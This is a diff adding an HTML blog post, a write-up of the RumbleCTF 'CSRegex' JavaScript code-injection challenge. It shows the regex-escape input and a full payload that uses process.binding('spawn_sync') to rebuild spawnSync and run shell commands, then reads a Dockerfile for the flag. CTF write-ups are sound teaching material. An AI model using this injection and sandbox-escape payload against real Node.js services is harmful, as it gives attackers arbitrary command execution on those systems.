@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Bruno Anjos">
+    <meta name="description" content="https://bruno-anjos.github.io">
+    <meta name="keywords" content="developer,personal,coder,hugo,blog">
+    
+    <meta property="og:site_name" content="Bruno Anjos">
+    <meta property="og:title" content="
+  RumbleCTF - CSRegex - Bruno Anjos
+">
+    <meta property="og:description" content="Writeup for the RumbleCTF CSRegex challenge. This is a javascript code injection challenge.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bruno-anjos.github.io/posts/csregex/">
+    <meta property="og:image" content="https://bruno-anjos.github.io">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="https://bruno-anjos.github.io/posts/csregex/">
+    <meta name="twitter:image" content="https://bruno-anjos.github.io">
+
+    <base href="https://bruno-anjos.github.io/posts/csregex/">
+    <title>
+  RumbleCTF - CSRegex - Bruno Anjos
+</title>
+
+    <link rel="canonical" href="https://bruno-anjos.github.io/posts/csregex/">
+    
+    <link  rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700">
+    <link rel="stylesheet" href="https://bruno-anjos.github.io/css/normalize.min.css">
+    <link rel="stylesheet" href="https://bruno-anjos.github.io/css/style.min.css">
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="https://bruno-anjos.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://bruno-anjos.github.io/images/favicon-16x16.png" sizes="16x16">
+
+    
+      <link rel="alternate" href="https://bruno-anjos.github.io/index.xml" type="application/rss+xml" title="Bruno Anjos">
+      <link href="https://bruno-anjos.github.io/index.xml" rel="feed" type="application/rss+xml" title="Bruno Anjos" />
+    
+
+    <meta name="generator" content="Hugo 0.74.3" />
+  </head>
+
+  <body class="">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">Bruno Anjos</a>
+    <input type="checkbox" id="menu-control"/>
+    <label class="menu-mobile  float-right " for="menu-control">
+      <span class="btn-mobile  float-right ">&#9776;</span>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://bruno-anjos.github.io/posts">Posts</a>
+            </li>
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://bruno-anjos.github.io/about">About</a>
+            </li>
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://bruno-anjos.github.io/contact">Contact me</a>
+            </li>
+          
+        
+        
+      </ul>
+    </label>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+  <article>
+    <header>
+      <h1 class="title">RumbleCTF - CSRegex</h1>
+      <h2 class="date">November 2, 2020</h2>
+
+      
+    </header>
+
+    <p>We are presented with an input where we can manipulate the regex match expression. We can easily escape the regex matching pattern by having our initial input as <code>a/g);</code>. After this we can input any Javascript code, and finally end with <code>//</code> to ignore the remaining characters. This code is running in some sort of context that doesn&rsquo;t allow us to import or require libraries. Nevertheless after googleing for a while we come across an example to bind libraries using <code>process.binding</code> and partially copying the code of <code>child_process</code> 😄</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">spawn_sync</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">binding</span><span class="p">(</span><span class="s1">&#39;spawn_sync&#39;</span><span class="p">);</span> <span class="nx">normalizeSpawnArguments</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">a</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span><span class="o">?</span><span class="nx">b</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">:</span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="nx">b</span><span class="p">,</span><span class="nx">b</span><span class="o">=</span><span class="p">[]),</span><span class="nx">a</span><span class="o">===</span><span class="kc">undefined</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="p">{}),</span><span class="nx">a</span><span class="o">=</span><span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span><span class="nx">a</span><span class="p">),</span><span class="nx">a</span><span class="p">.</span><span class="nx">shell</span><span class="p">){</span><span class="kr">const</span> <span class="nx">g</span><span class="o">=</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">concat</span><span class="p">(</span><span class="nx">b</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span><span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">shell</span><span class="o">===</span><span class="s1">&#39;string&#39;</span><span class="o">?</span><span class="nx">c</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">shell</span><span class="o">:</span><span class="nx">c</span><span class="o">=</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">,</span><span class="nx">b</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="nx">g</span><span class="p">];}</span><span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span><span class="o">===</span><span class="s1">&#39;string&#39;</span><span class="o">?</span><span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">argv0</span><span class="p">)</span><span class="o">:</span><span class="nx">b</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span><span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">env</span><span class="o">||</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">;</span><span class="kd">var</span> <span class="nx">e</span><span class="o">=</span><span class="p">[];</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">f</span> <span class="k">in</span> <span class="nx">d</span><span class="p">)</span><span class="nx">e</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">f</span><span class="o">+</span><span class="s1">&#39;=&#39;</span><span class="o">+</span><span class="nx">d</span><span class="p">[</span><span class="nx">f</span><span class="p">]);</span><span class="k">return</span><span class="p">{</span><span class="nx">file</span><span class="o">:</span><span class="nx">c</span><span class="p">,</span><span class="nx">args</span><span class="o">:</span><span class="nx">b</span><span class="p">,</span><span class="nx">options</span><span class="o">:</span><span class="nx">a</span><span class="p">,</span><span class="nx">envPairs</span><span class="o">:</span><span class="nx">e</span><span class="p">};}</span>
+
+<span class="c1">// Defines spawnSync, the function that will do the actual spawning
+</span><span class="c1"></span><span class="nx">spawnSync</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nx">normalizeSpawnArguments</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="nx">arguments</span><span class="p">);</span><span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="nx">d</span><span class="p">.</span><span class="nx">options</span><span class="p">;</span><span class="kd">var</span> <span class="nx">c</span><span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">file</span><span class="o">=</span><span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span><span class="nx">a</span><span class="p">.</span><span class="nx">args</span><span class="o">=</span><span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">,</span><span class="nx">a</span><span class="p">.</span><span class="nx">envPairs</span><span class="o">=</span><span class="nx">d</span><span class="p">.</span><span class="nx">envPairs</span><span class="p">,</span><span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="o">=</span><span class="p">[{</span><span class="nx">type</span><span class="o">:</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span><span class="nx">readable</span><span class="o">:!</span><span class="mi">0</span><span class="p">,</span><span class="nx">writable</span><span class="o">:!</span><span class="mi">1</span><span class="p">},{</span><span class="nx">type</span><span class="o">:</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span><span class="nx">readable</span><span class="o">:!</span><span class="mi">1</span><span class="p">,</span><span class="nx">writable</span><span class="o">:!</span><span class="mi">0</span><span class="p">},{</span><span class="nx">type</span><span class="o">:</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span><span class="nx">readable</span><span class="o">:!</span><span class="mi">1</span><span class="p">,</span><span class="nx">writable</span><span class="o">:!</span><span class="mi">0</span><span class="p">}],</span><span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">){</span><span class="kd">var</span> <span class="nx">g</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span><span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="nx">g</span><span class="p">.</span><span class="nx">input</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">;}</span><span class="k">for</span><span class="p">(</span><span class="nx">c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">c</span><span class="o">&lt;</span><span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">c</span><span class="o">++</span><span class="p">){</span><span class="kd">var</span> <span class="nx">e</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">&amp;&amp;</span><span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">input</span><span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="o">!=</span><span class="kc">null</span><span class="p">){</span><span class="kd">var</span> <span class="nx">f</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">=</span><span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span><span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span><span class="nx">isUint8Array</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">?</span><span class="nx">f</span><span class="p">.</span><span class="nx">input</span><span class="o">=</span><span class="nx">e</span><span class="o">:</span><span class="nx">f</span><span class="p">.</span><span class="nx">input</span><span class="o">=</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);}}</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span><span class="kd">var</span> <span class="nx">b</span><span class="o">=</span><span class="nx">spawn_sync</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="o">&amp;&amp;</span><span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="o">&amp;&amp;</span><span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="o">!==</span><span class="s1">&#39;buffer&#39;</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="nx">c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">c</span><span class="o">&lt;</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">c</span><span class="o">++</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span><span class="k">continue</span><span class="p">;</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);}</span><span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stdout</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="o">&amp;&amp;</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nx">b</span><span class="p">.</span><span class="nx">stderr</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="o">&amp;&amp;</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">+</span> <span class="s1">&#39;spawnSync &#39;</span><span class="o">+</span><span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span><span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">path</span><span class="o">=</span><span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span><span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">spawnargs</span><span class="o">=</span><span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span><span class="nx">b</span><span class="p">;}</span>
+</code></pre></div><p>After having these two functions defined we can run any command by doing</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">return</span> <span class="nx">spawnSync</span><span class="p">(</span><span class="s2">&#34;cmd&#34;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">,</span> <span class="s1">&#39;list&#39;</span><span class="p">])</span>
+</code></pre></div><p>This might be a bit overkill, but it was the solution i found. Now we can enumerate the whole system pretty much. After digging in the files if we cat the file <code>/app/dockerfile</code> one of the layers is to echo the flag. Done!</p>
+
+  </article>
+
+  <br/>
+
+  
+  
+</section>
+
+      </div>
+      
+    </main>
+
+    
+
+  <script src="https://bruno-anjos.github.io/js/app.js"></script>
+  
+  </body>
+</html>
